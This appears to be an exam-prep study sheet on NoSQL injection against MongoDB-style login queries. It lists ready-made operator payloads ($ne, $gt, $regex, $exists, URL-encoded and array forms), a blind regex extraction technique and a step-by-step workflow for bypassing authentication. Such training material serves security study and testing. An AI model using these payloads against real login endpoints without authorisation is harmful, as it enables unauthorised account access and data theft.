## Advanced Injection Attacks — NoSQL Fundamentals & Injection (Auth Bypass)

## Objective
Understand NoSQL behavior and exploit injection to:
- Bypass authentication
- Manipulate queries
- Access unauthorized data

Think: *“How is the query built—and can I change its logic?”*

---

## 1. NoSQL Fundamentals

### What is NoSQL

- Non-relational databases
- Common types:
  - MongoDB (most common in exams)
  - CouchDB
  - Firebase

---

### Data format (MongoDB)

```json
{
  "username": "admin",
  "password": "123456"
}
```

---

### Query example

```javascript
db.users.find({
  username: "admin",
  password: "123456"
})
```

---

## 2. Why NoSQL Injection Happens

- Queries built directly from user input
- No strict schema
- JSON interpreted as query object

---

## 3. Authentication Bypass (Core Attack)

### Normal query

```javascript
db.users.find({
  username: input_user,
  password: input_pass
})
```

---

### Injected input

```json
{
  "username": "admin",
  "password": { "$ne": null }
}
```

---

### Resulting query

```javascript
db.users.find({
  username: "admin",
  password: { "$ne": null }
})
```

→ Matches any password ≠ null → login bypass

---

## 4. Common Operators

### `$ne` (not equal)

```json
{"password": {"$ne": null}}
```

---

### `$gt` (greater than)

```json
{"password": {"$gt": ""}}
```

---

### `$regex`

```json
{"username": {"$regex": "admin"}}
```

---

### `$exists`

```json
{"password": {"$exists": true}}
```

---

## 5. Injection Techniques

### A. JSON Injection

```json
{"username":"admin","password":{"$ne":null}}
```

---

### B. String-based injection (if parsed)

```text
admin' || '1'=='1
```

---

### C. URL-encoded injection

```
username=admin&password[$ne]=null
```

---

### D. Array injection

```json
{"password": ["wrong", {"$ne": null}]}
```

---

## 6. Blind NoSQL Injection

### Boolean-based

```json
{"password": {"$ne": "wrong"}}
```

→ True condition

---

### Regex extraction

```json
{"username": {"$regex": "^a"}}
```

→ Check first character

---

## 7. Indicators of Vulnerability

- Login bypass with crafted JSON
- Different responses with operators
- No validation of input structure
- Unexpected matches

---

## 8. Fast Workflow (Exam Mode)

1. Identify login endpoint
2. Send normal request
3. Replace password with:

```json
{"$ne": null}
```

4. Try:
   - $gt
   - $regex
5. Observe:
   - login success?
   - response changes?
6. Confirm bypass

---

## 9. Mental Model

SQL injection:
→ Break query string  

NoSQL injection:
→ Change query structure  

You are not escaping the query  
→ You are becoming the query